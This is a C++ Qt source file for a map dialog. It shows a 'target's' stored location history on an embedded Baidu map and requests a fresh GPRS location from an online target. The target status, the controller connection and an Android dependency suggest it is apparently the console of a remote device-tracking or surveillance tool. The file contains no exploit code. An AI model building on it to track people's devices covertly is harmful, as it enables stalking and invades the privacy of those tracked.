#include "mapinfodlg.h"
#include "target.h"
#include "DatabaseManager.h"
#include "nofocusstyle.h"
#include "Utility.h"
#include "maindlg.h"

#include <QAxWidget>
#include <QAxObject>

#include <MsHTML.h>

#include <exdisp.h>

MapInfoDlg::MapInfoDlg(QWidget *parent, Target* tar)
	: QWidget(parent)
	, m_tar(tar)
{
	ui.setupUi(this);

	InitConnection();
	InitWidgetAppearance();
	InitMapInfo();
}

MapInfoDlg::~MapInfoDlg()
{

}

void MapInfoDlg::InitConnection()
{
	// 点击获取位置按钮
	connect(ui.btnGetLocation, SIGNAL(clicked()), this, SLOT(onBtnGetLocationClicked()));

	// 点击历史记录
	connect(ui.tbLocationHistory, SIGNAL(itemClicked(QTableWidgetItem*)), this, SLOT(onTbLocationHistoryItemClicked(QTableWidgetItem*)));
}

void MapInfoDlg::InitWidgetAppearance()
{
	// 地图
	NoFocusStyle* nofocusStyle = new NoFocusStyle(this);
	//ui.spltMap->setStretchFactor(1, 1);
	QHBoxLayout* layout = new QHBoxLayout(ui.mapContainer);
	m_webBrowser = new QAxWidget(ui.mapContainer);
	layout->addWidget(m_webBrowser);
	layout->setContentsMargins(1, 1, 1, 1);
	m_webBrowser->setControl("Shell.Explorer");
	ui.tbLocationHistory->setStyle(nofocusStyle);
}

void MapInfoDlg::InitMapInfo()
{
	std::wstring html = GetExePath() + L"\\dependency\\Android\\baidu_map.html";
	m_webBrowser->dynamicCall("Navigate(QString)", QString::fromStdWString(html)); 
	DM->QueryLocationInfo(this->m_tar->dwTargetID, ui.tbLocationHistory);
}

void MapInfoDlg::onTbLocationHistoryItemClicked(QTableWidgetItem* item)
{
	QTableWidgetItem* xItem = ui.tbLocationHistory->item(item->row(), 0);
	QTableWidgetItem* yItem = ui.tbLocationHistory->item(item->row(), 1);
	std::wstring x = xItem->data(Qt::UserRole).toString().toStdWString();
	std::wstring y = yItem->data(Qt::UserRole).toString().toStdWString();

	IWebBrowser2 *webBrowser = 0;
	m_webBrowser->queryInterface(IID_IWebBrowser2, (void **)&webBrowser);

	if ( webBrowser )
	{
		VARIANT_BOOL result;
		HRESULT busy = webBrowser->get_Busy(&result);

		if ( VARIANT_TRUE == result )
		{
			QMessageBox::information(
				this, 
				QString::fromLocal8Bit("提示"), 
				QString::fromLocal8Bit("加载地图失败，请检查网络连接是否正常"));
			return;
		}
	}

	SetLocation(x, y);
}

void MapInfoDlg::SetLocation(std::wstring x, std::wstring y)
{
	QAxObject *document = m_webBrowser->querySubObject("Document");
	IHTMLDocument2 *doc2;
	document->queryInterface(QUuid(IID_IHTMLDocument2), (void**)&doc2);

	if ( doc2 )
	{
		IHTMLWindow2 *win2 = NULL;
		if (doc2->get_parentWindow(&win2) == S_OK)
		{
			WCHAR locationInfo[MAX_PATH] = {0};
			wsprintf(locationInfo, L"setLocation(%s,%s)", x.c_str(), y.c_str());
			BSTR s1 = SysAllocString(locationInfo);
			BSTR s2 = SysAllocString(L"JavaScript");
			VARIANT ret;
			win2->execScript(s1, s2, &ret);
			SysFreeString(s2);
			SysFreeString(s1);
		}
	}
}

void MapInfoDlg::onBtnGetLocationClicked()
{
	if (m_tar->tarStatus == TAROFFLINE)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("不能获取离线目标的位置!"));
		return;
	}

	SetTarStatusInfoExW(STATUS_INFO, this->m_tar, L"正在获取目标所在地，请稍候 ...");

	FrmMain->ctrConn->Send_GPRS(m_tar->dwTargetID);
}

void MapInfoDlg::GetNewLocation( MSG* msg )
{
	ui.tbLocationHistory->clearContents();
	DM->QueryLocationInfo(this->m_tar->dwTargetID, ui.tbLocationHistory);

	QTableWidgetItem* xItem = ui.tbLocationHistory->item(0, 0);
	QTableWidgetItem* yItem = ui.tbLocationHistory->item(0, 1);
	SetLocation(xItem->data(Qt::UserRole).toString().toStdWString(), 
		yItem->data(Qt::UserRole).toString().toStdWString());
}
